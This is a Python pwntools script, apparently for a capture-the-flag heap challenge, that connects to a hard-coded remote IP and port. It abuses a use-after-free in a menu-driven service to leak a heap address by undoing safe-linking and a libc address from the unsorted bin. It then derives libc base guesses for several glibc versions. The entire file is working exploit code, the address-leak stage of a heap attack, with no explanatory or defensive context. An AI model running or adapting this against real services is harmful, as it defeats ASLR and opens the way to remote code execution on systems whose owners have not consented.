from pwn import *
import struct
context.log_level='error'
HOST='52.76.96.108'; PORT=9005

def create(p, idx, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendlineafter(b'data: ', data)
    p.recvuntil(b'> ', timeout=3)

def delete(p, idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.recvuntil(b'> ', timeout=3)

def readn(p, idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(idx).encode())
    r=p.recvuntil(b'> ', timeout=3)
    i=r.find(b'data: ')
    return r[i+6:r.find(b'\n',i)]

def leaks():
    p=remote(HOST,PORT); p.recvuntil(b'> ')
    create(p,0,0x80,b'A'*0x80)
    create(p,1,0x80,b'B'*0x80)
    delete(p,0)
    delete(p,1)
    d=readn(p,1)
    fd=struct.unpack('<Q',d[:8])[0]
    heap0 = fd << 12
    create(p,2,0x500,b'C'*0x500)
    create(p,3,0x500,b'D'*0x500)
    create(p,4,0x20,b'E'*0x20)
    delete(p,2)
    d2=readn(p,2)
    unsorted=struct.unpack('<Q',d2[:8])[0]
    p.close()
    return heap0, unsorted

for _ in range(3):
    h0,un=leaks()
    print("heap(0)=%#x unsorted=%#x"%(h0,un))
    for name,main_arena,off in [("2.31",0x1ebb80,0x70),("2.35a",0x21ac80,0x70),("2.35b",0x1ecb80,0x70),("2.39",0x21ac40,0x70),("2.23",0x3c4b20,0x68)]:
        base=un-(main_arena+off)
        print("   %s: libc_base=%#x (low12=%#x)"%(name,base,base&0xfff))
